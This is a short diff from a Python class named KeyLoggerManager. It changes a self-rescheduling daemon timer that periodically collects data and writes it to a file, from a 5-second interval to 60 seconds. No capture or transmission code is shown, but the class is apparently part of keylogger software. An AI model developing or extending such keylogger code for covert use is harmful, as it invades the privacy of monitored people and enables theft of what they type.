@@ -49,7 +49,7 @@ class KeyLoggerManager:
         self.__write(data_to_write=data_for_file)          
 
     def start_get_data_counter(self):
-        t = threading.Timer(5.0, self.start_get_data_counter)
+        t = threading.Timer(60.0, self.start_get_data_counter)
         t.daemon = True
         t.start()
         
